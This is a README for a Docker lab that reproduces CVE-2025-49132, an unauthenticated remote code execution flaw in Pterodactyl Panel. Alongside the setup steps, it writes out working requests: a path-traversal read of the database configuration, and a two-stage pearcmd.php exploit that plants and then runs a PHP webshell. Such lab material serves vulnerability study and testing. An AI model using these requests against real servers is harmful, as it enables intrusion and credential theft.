# CVE-2025-49132 - Pterodactyl Panel Unauthenticated RCE

## Vulnerability Overview

- **CVE ID**: CVE-2025-49132
- **CWE**: CWE-94 (Improper Control of Generation of Code)
- **CVSS Score**: 10.0 (Critical)
- **Affected Versions**: < 1.11.11
- **Fixed Version**: 1.11.11

## Environment Setup

### Prerequisites

- Docker
- Docker Compose

### Start Vulnerable Environment

```bash
cd /path/to/CVE-2025-49132
docker-compose up -d
```

### Verify Services

Wait for containers to fully initialize (approximately 2-3 minutes for database migrations).

The following services will be available:

- Pterodactyl Panel: http://localhost:8080
- MariaDB: Internal (port 3306)
- Redis: Internal

### Check Container Status

```bash
docker-compose ps
docker-compose logs -f panel
```

Wait until the panel container shows "Starting supervisord" indicating it is ready.

### Stop Environment

```bash
docker-compose down -v
```

## Vulnerable Endpoint

### Information Disclosure

```
GET /locales/locale.json?locale=../../../app&namespace=config/database
```

### Remote Code Execution (via pearcmd.php)

Stage 1 - Create webshell:
```
GET /locales/locale.json?+config-create+/&locale=../../../usr/local/lib/php&namespace=pearcmd&/<?=`id`?>+/tmp/shell.php
```

Stage 2 - Execute webshell:
```
GET /locales/locale.json?locale=../../../../tmp&namespace=shell
```

## References

- [GitHub Security Advisory GHSA-24wv-6c99-f843](https://github.com/pterodactyl/panel/security/advisories/GHSA-24wv-6c99-f843)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-49132)
